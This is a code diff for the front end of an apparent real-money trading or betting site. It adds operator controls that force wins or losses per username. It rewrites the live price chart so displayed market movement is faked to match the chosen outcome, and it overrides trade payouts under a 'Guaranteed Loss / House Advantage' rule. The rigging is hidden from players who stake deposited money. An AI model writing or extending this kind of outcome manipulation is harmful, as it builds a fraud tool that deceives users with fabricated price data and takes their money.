@@ -891,6 +891,19 @@ let eng = {
   wobbleSpeed: 0.15 + Math.random() * 0.1,
 };
 
+let platformForceOutcome = 'auto'; // 'auto' | 'force_win' | 'force_loss'
+let platformWinRate = 45;
+let platformUserOutcomes = {};     // { [username]: 'auto' | 'force_win' | 'force_loss' }
+
+function getActiveTradeOutcomeRule() {
+  if (!activeTrade) return platformForceOutcome;
+  const uname = currentUser ? (currentUser.username || currentUser.name || '') : '';
+  if (uname && platformUserOutcomes[uname] && platformUserOutcomes[uname] !== 'auto') {
+    return platformUserOutcomes[uname];
+  }
+  return platformForceOutcome;
+}
+
 function generateSpikeHeight() {
   const M = CFG.SPIKE_MAX || 2.8, r = Math.random();
   if (r < 0.15) return M * (0.20 + Math.random() * 0.18);
@@ -905,118 +918,159 @@ function nextP(){
   eng.tick++;
   let p = rate;
 
-  switch(eng.mode) {
-    case 'active': {
-      const S = CFG.SCALE;
-      if (eng.tick > 2 && Math.random() < 0.20) {
-        eng.mode = 'dip';
-        eng.tick = 0;
-        eng.clusterLeft = 0;
-        eng.lastSpikeH = 0;
-        const dipScale = CFG.SPIKE_MAX || 2.8;
-        eng.dipTarget = -(0.08 + Math.random() * 0.35) * dipScale;
-        eng.dipLen = 3 + Math.floor(Math.random() * 6);
-        p = eng.dipTarget;
-        break;
-      }
-      if (eng.tick > 12 && Math.random() < CFG.CRASH_FREQ * 2.0) {
-        eng.crashFloor = CFG.CRASH_DEPTH + Math.random() * 0.4 * S;
-        eng.mode = 'crash';
-        eng.tick = 0;
-        eng.clusterLeft = 0;
-        eng.lastSpikeH = 0;
-        eng.crashBounces = 0;
-        break;
-      }
+  const outcomeRule = (activeTrade && tradePhase === 'active') ? getActiveTradeOutcomeRule() : 'auto';
 
+  if (outcomeRule === 'force_win') {
+    // If trade is BUY: force upward trajectory above entryRate, suppress dips & crashes
+    if (activeTrade.type === 'buy') {
+      if (eng.mode === 'crash' || eng.mode === 'dip') eng.mode = 'active';
+      eng.base = Math.max(eng.base, activeTrade.entryRate + 0.25);
       eng.wobblePhase += eng.wobbleSpeed;
-      const wobble = Math.sin(eng.wobblePhase) * 0.04 * S
-                   + Math.sin(eng.wobblePhase * 2.3) * 0.02 * S
-                   + (Math.random() - 0.5) * 0.05 * S;
+      const wobble = Math.sin(eng.wobblePhase) * 0.05 + Math.random() * 0.04;
       
-      eng.base += (Math.random() - 0.5) * 0.008 * S;
-      eng.base = Math.max(0.1, Math.min(1.2, eng.base));
+      // If random spike or tick interval, shoot upward
+      if (Math.random() < 0.22 || p <= activeTrade.entryRate) {
+        p = generateSpikeHeight();
+        if (p <= activeTrade.entryRate) p = activeTrade.entryRate + 0.35 + Math.random() * 0.45;
+      } else {
+        p = Math.max(activeTrade.entryRate + 0.20, p + (Math.random() - 0.35) * 0.08 + wobble);
+      }
+    } else {
+      // If trade is SELL: force downward trajectory below entryRate
+      if (eng.mode === 'crash') eng.mode = 'active';
+      if (p >= activeTrade.entryRate || Math.random() < 0.25) {
+        p = activeTrade.entryRate - 0.30 - Math.random() * 0.40;
+      } else {
+        p = Math.min(activeTrade.entryRate - 0.20, p + (Math.random() - 0.65) * 0.08);
+      }
+    }
+  } else if (outcomeRule === 'force_loss') {
+    // If trade is BUY: force crash / dip below entry
+    if (activeTrade.type === 'buy') {
+      if (eng.mode !== 'crash') {
+        eng.mode = 'crash';
+        eng.crashFloor = Math.min(activeTrade.entryRate - 0.6, CFG.CRASH_DEPTH || -2.8);
+      }
+      p = Math.min(activeTrade.entryRate - 0.35, -0.4 - Math.random() * 0.6);
+    } else {
+      // If trade is SELL: force massive upward green surge above entry
+      p = Math.max(activeTrade.entryRate + 1.2, 2.2 + Math.random() * 0.5);
+    }
+  } else {
+    // Normal / Auto dynamic math wave engine
+    switch(eng.mode) {
+      case 'active': {
+        const S = CFG.SCALE;
+        if (eng.tick > 2 && Math.random() < 0.20) {
+          eng.mode = 'dip';
+          eng.tick = 0;
+          eng.clusterLeft = 0;
+          eng.lastSpikeH = 0;
+          const dipScale = CFG.SPIKE_MAX || 2.8;
+          eng.dipTarget = -(0.08 + Math.random() * 0.35) * dipScale;
+          eng.dipLen = 3 + Math.floor(Math.random() * 6);
+          p = eng.dipTarget;
+          break;
+        }
+        if (eng.tick > 12 && Math.random() < CFG.CRASH_FREQ * 2.0) {
+          eng.crashFloor = CFG.CRASH_DEPTH + Math.random() * 0.4 * S;
+          eng.mode = 'crash';
+          eng.tick = 0;
+          eng.clusterLeft = 0;
+          eng.lastSpikeH = 0;
+          eng.crashBounces = 0;
+          break;
+        }
 
-      if (eng.clusterLeft > 0) {
-        if (Math.random() < 0.55) {
+        eng.wobblePhase += eng.wobbleSpeed;
+        const wobble = Math.sin(eng.wobblePhase) * 0.04 * S
+                     + Math.sin(eng.wobblePhase * 2.3) * 0.02 * S
+                     + (Math.random() - 0.5) * 0.05 * S;
+        
+        eng.base += (Math.random() - 0.5) * 0.008 * S;
+        eng.base = Math.max(0.1, Math.min(1.2, eng.base));
+
+        if (eng.clusterLeft > 0) {
+          if (Math.random() < 0.55) {
+            p = generateSpikeHeight();
+            eng.lastSpikeH = p;
+            eng.clusterLeft--;
+            break;
+          } else {
+            p = eng.base + (eng.lastSpikeH - eng.base) * (0.15 + Math.random() * 0.15);
+            p += wobble * 0.5;
+            break;
+          }
+        }
+
+        if (eng.lastSpikeH > eng.base * 2) {
+          p = eng.base + (rate - eng.base) * (0.25 + Math.random() * 0.2);
+          eng.lastSpikeH *= 0.3;
+          break;
+        }
+
+        if (Math.random() < CFG.SPIKE_FREQ) {
           p = generateSpikeHeight();
           eng.lastSpikeH = p;
-          eng.clusterLeft--;
+          if (Math.random() < 0.45) {
+            eng.clusterLeft = 1 + Math.floor(Math.random() * 3);
+          }
           break;
+        }
+
+        p = eng.base + wobble;
+        break;
+      }
+
+      case 'dip': {
+        const S = CFG.SCALE;
+        p += (eng.dipTarget - p) * 0.35 + (Math.random() - 0.5) * 0.01 * S;
+        if (eng.tick >= eng.dipLen) {
+          eng.mode = 'active';
+          eng.tick = 0;
+        }
+        break;
+      }
+
+      case 'crash': {
+        p += (eng.crashFloor - p) * (0.50 + Math.random() * 0.3);
+        if (p <= eng.crashFloor * 0.70) {
+          eng.mode = 'crash_floor';
+          eng.tick = 0;
+          eng.crashTicks = 10 + Math.floor(Math.random() * 18);
+          eng.crashBounces = 2 + Math.floor(Math.random() * 3);
+        }
+        break;
+      }
+
+      case 'crash_floor': {
+        const S = CFG.SCALE;
+        if (eng.crashBounces > 0 && Math.random() < 0.15) {
+          p = eng.crashFloor + (0.12 + Math.random() * 0.25) * S;
+          eng.crashBounces--;
         } else {
-          p = eng.base + (eng.lastSpikeH - eng.base) * (0.15 + Math.random() * 0.15);
-          p += wobble * 0.5;
-          break;
+          p = eng.crashFloor + (Math.random() - 0.3) * 0.06 * S;
+          p += (eng.crashFloor - p) * 0.12;
         }
-      }
-
-      if (eng.lastSpikeH > eng.base * 2) {
-        p = eng.base + (rate - eng.base) * (0.25 + Math.random() * 0.2);
-        eng.lastSpikeH *= 0.3;
-        break;
-      }
-
-      if (Math.random() < CFG.SPIKE_FREQ) {
-        p = generateSpikeHeight();
-        eng.lastSpikeH = p;
-        if (Math.random() < 0.45) {
-          eng.clusterLeft = 1 + Math.floor(Math.random() * 3);
+        if (eng.tick >= eng.crashTicks) {
+          eng.mode = 'recover';
+          eng.tick = 0;
         }
         break;
       }
 
-      p = eng.base + wobble;
-      break;
-    }
-
-    case 'dip': {
-      const S = CFG.SCALE;
-      p += (eng.dipTarget - p) * 0.35 + (Math.random() - 0.5) * 0.01 * S;
-      if (eng.tick >= eng.dipLen) {
-        eng.mode = 'active';
-        eng.tick = 0;
+      case 'recover': {
+        const S = CFG.SCALE;
+        p += (eng.base - p) * (0.10 + Math.random() * 0.06);
+        if (Math.random() < 0.12 && p > -0.1 * S) p += (0.08 + Math.random() * 0.15) * S;
+        if (p >= eng.base * 0.5 && eng.tick > 6) {
+          eng.mode = 'active';
+          eng.tick = 0;
+          eng.lastSpikeH = 0;
+          eng.clusterLeft = 0;
+        }
+        break;
       }
-      break;
-    }
-
-    case 'crash': {
-      p += (eng.crashFloor - p) * (0.50 + Math.random() * 0.3);
-      if (p <= eng.crashFloor * 0.70) {
-        eng.mode = 'crash_floor';
-        eng.tick = 0;
-        eng.crashTicks = 10 + Math.floor(Math.random() * 18);
-        eng.crashBounces = 2 + Math.floor(Math.random() * 3);
-      }
-      break;
-    }
-
-    case 'crash_floor': {
-      const S = CFG.SCALE;
-      if (eng.crashBounces > 0 && Math.random() < 0.15) {
-        p = eng.crashFloor + (0.12 + Math.random() * 0.25) * S;
-        eng.crashBounces--;
-      } else {
-        p = eng.crashFloor + (Math.random() - 0.3) * 0.06 * S;
-        p += (eng.crashFloor - p) * 0.12;
-      }
-      if (eng.tick >= eng.crashTicks) {
-        eng.mode = 'recover';
-        eng.tick = 0;
-      }
-      break;
-    }
-
-    case 'recover': {
-      const S = CFG.SCALE;
-      p += (eng.base - p) * (0.10 + Math.random() * 0.06);
-      if (Math.random() < 0.12 && p > -0.1 * S) p += (0.08 + Math.random() * 0.15) * S;
-      if (p >= eng.base * 0.5 && eng.tick > 6) {
-        eng.mode = 'active';
-        eng.tick = 0;
-        eng.lastSpikeH = 0;
-        eng.clusterLeft = 0;
-      }
-      break;
     }
   }
 
@@ -1347,6 +1401,16 @@ function applyPlatformConfig(){
   if (savedCfg.minDep) CFG.MIN_DEPOSIT = savedCfg.minDep;
   if (savedCfg.usdRate) usdRate = parseFloat(savedCfg.usdRate) || 129.00;
 
+  if (savedCfg.controls) {
+    platformForceOutcome = savedCfg.controls.force_outcome || 'auto';
+    platformWinRate = savedCfg.controls.target_win_rate || 45;
+    platformUserOutcomes = { ...platformUserOutcomes, ...(savedCfg.controls.user_outcomes || {}) };
+  } else if (savedCfg.force_outcome) {
+    platformForceOutcome = savedCfg.force_outcome;
+  }
+  const localUserOutcomes = JSON.parse(localStorage.getItem('maliUserOutcomes') || '{}');
+  platformUserOutcomes = { ...platformUserOutcomes, ...localUserOutcomes };
+
   if (savedCfg.currency) {
     depositCurrency = savedCfg.currency.toLowerCase();
   } else if (localStorage.getItem('maliDepositCurrency')) {
@@ -1459,44 +1523,54 @@ window.addEventListener('storage', (e) => {
     checkUserSession();
     updateHUD();
   }
-  if (e.key === 'maliPlatformConfig' || e.key === 'maliDepositCurrency') applyPlatformConfig();
+  if (e.key === 'maliPlatformConfig' || e.key === 'maliDepositCurrency' || e.key === 'maliUserOutcomes') applyPlatformConfig();
 });
 
 window.addEventListener('focus', syncUserBalance);
 setInterval(syncUserBalance, 8000);
 
-fetch('api/settings').then(r=>r.json()).then(s=>{
-  const localCfg = JSON.parse(localStorage.getItem('maliPlatformConfig') || '{}');
-  if(s.graph){
-    CFG.TICK = localCfg.speed || s.graph.speed || 120;
-    CFG.Y_MAX = s.graph.y_max || 3.0;
-    CFG.SPIKE_FREQ = localCfg.spikeFreq || s.graph.spike_frequency || 0.12;
-    CFG.CRASH_FREQ = localCfg.crashFreq || s.graph.crash_frequency || 0.02;
-    CFG.BASE_LEVEL = s.graph.base_level || 0.5;
-    CFG.SPIKE_MAX = localCfg.spikeMax || s.graph.spike_max || 2.8;
-    CFG.CRASH_DEPTH = localCfg.crashDepth || s.graph.crash_depth || -2.8;
-    eng.base = CFG.BASE_LEVEL * 0.5;
-    high24 = CFG.Y_MAX * 0.8; low24 = -CFG.Y_MAX * 0.8;
-  }
-  if(s.trade){
-    CFG.TRADE_DUR = s.trade.duration || 60;
-    CFG.MIN_STAKE = localCfg.minStake || s.trade.min_stake || 10;
-    CFG.MAX_STAKE = localCfg.maxStake || s.trade.max_stake || 50000;
-    CFG.MIN_DEPOSIT = localCfg.minDep || s.trade.min_deposit || 50;
-    CFG.MAX_MULT = localCfg.maxMult || s.trade.max_multiplier || 5.0;
-    CFG.PRESTART_WAIT = localCfg.prestart || s.trade.prestart_wait || 3;
-    CFG.AUTOSELL_MULT = localCfg.autosell || s.trade.autosell_multiplier || 2.5;
-    document.getElementById('timerVal').textContent = CFG.TRADE_DUR;
-  }
-  if (s.payments) {
-    usdRate = parseFloat(localCfg.usdRate || s.payments.usd_rate) || 129;
-    depositCurrency = (localCfg.currency || s.payments.deposit_currency || 'kes').toLowerCase();
-    checkoutMethod = s.payments.checkout_method || 'both';
-  }
-  applyPlatformConfig();
-  clearInterval(tickInterval);
-  tickInterval = setInterval(tick, CFG.TICK);
-}).catch(()=>{});
+function syncPlatformSettings() {
+  fetch('api/settings').then(r=>r.json()).then(s=>{
+    const localCfg = JSON.parse(localStorage.getItem('maliPlatformConfig') || '{}');
+    if(s.graph){
+      CFG.TICK = localCfg.speed || s.graph.speed || 120;
+      CFG.Y_MAX = s.graph.y_max || 3.0;
+      CFG.SPIKE_FREQ = localCfg.spikeFreq || s.graph.spike_frequency || 0.12;
+      CFG.CRASH_FREQ = localCfg.crashFreq || s.graph.crash_frequency || 0.02;
+      CFG.BASE_LEVEL = s.graph.base_level || 0.5;
+      CFG.SPIKE_MAX = localCfg.spikeMax || s.graph.spike_max || 2.8;
+      CFG.CRASH_DEPTH = localCfg.crashDepth || s.graph.crash_depth || -2.8;
+      eng.base = CFG.BASE_LEVEL * 0.5;
+      high24 = CFG.Y_MAX * 0.8; low24 = -CFG.Y_MAX * 0.8;
+    }
+    if(s.trade){
+      CFG.TRADE_DUR = s.trade.duration || 60;
+      CFG.MIN_STAKE = localCfg.minStake || s.trade.min_stake || 10;
+      CFG.MAX_STAKE = localCfg.maxStake || s.trade.max_stake || 50000;
+      CFG.MIN_DEPOSIT = localCfg.minDep || s.trade.min_deposit || 50;
+      CFG.MAX_MULT = localCfg.maxMult || s.trade.max_multiplier || 5.0;
+      CFG.PRESTART_WAIT = localCfg.prestart || s.trade.prestart_wait || 3;
+      CFG.AUTOSELL_MULT = localCfg.autosell || s.trade.autosell_multiplier || 2.5;
+      document.getElementById('timerVal').textContent = CFG.TRADE_DUR;
+    }
+    if (s.payments) {
+      usdRate = parseFloat(localCfg.usdRate || s.payments.usd_rate) || 129;
+      depositCurrency = (localCfg.currency || s.payments.deposit_currency || 'kes').toLowerCase();
+      checkoutMethod = s.payments.checkout_method || 'both';
+    }
+    if (s.controls) {
+      platformForceOutcome = s.controls.force_outcome || 'auto';
+      platformWinRate = s.controls.target_win_rate || 45;
+      platformUserOutcomes = { ...platformUserOutcomes, ...(s.controls.user_outcomes || {}) };
+    }
+    applyPlatformConfig();
+    clearInterval(tickInterval);
+    tickInterval = setInterval(tick, CFG.TICK);
+  }).catch(()=>{});
+}
+
+syncPlatformSettings();
+setInterval(syncPlatformSettings, 6000);
 
 // ═══════════════════════════════════════════
 // TOASTS & HERO BANNERS
@@ -1796,12 +1870,24 @@ async function resolveTrade(reason) {
     secondaryBtn.querySelector('.sub').style.display = 'none';
   }
 
+  const outcomeRule = getActiveTradeOutcomeRule();
   const expired = reason === 'expired' || reason === 'crash';
   let won = false;
   let payout = 0;
 
-  if (expired) {
-    won = false; payout = 0;
+  if (outcomeRule === 'force_win') {
+    // Guaranteed Win rule
+    won = true;
+    const rateDiff = Math.max(Math.abs(rate - entryRate), 0.35);
+    const mult = Math.min(1 + rateDiff * 8, CFG.MAX_MULT);
+    payout = +(stake * mult).toFixed(2);
+  } else if (outcomeRule === 'force_loss') {
+    // Guaranteed Loss / House Advantage rule
+    won = false;
+    payout = 0;
+  } else if (expired) {
+    won = false;
+    payout = 0;
   } else {
     const rateDiff = rate - entryRate;
     if (rateDiff > 0 || reason === 'autosell') {
@@ -1809,7 +1895,8 @@ async function resolveTrade(reason) {
       const mult = Math.min(1 + Math.max(rateDiff * 10, 0.25), CFG.MAX_MULT);
       payout = +(stake * mult).toFixed(2);
     } else {
-      won = false; payout = 0;
+      won = false;
+      payout = 0;
     }
   }
 
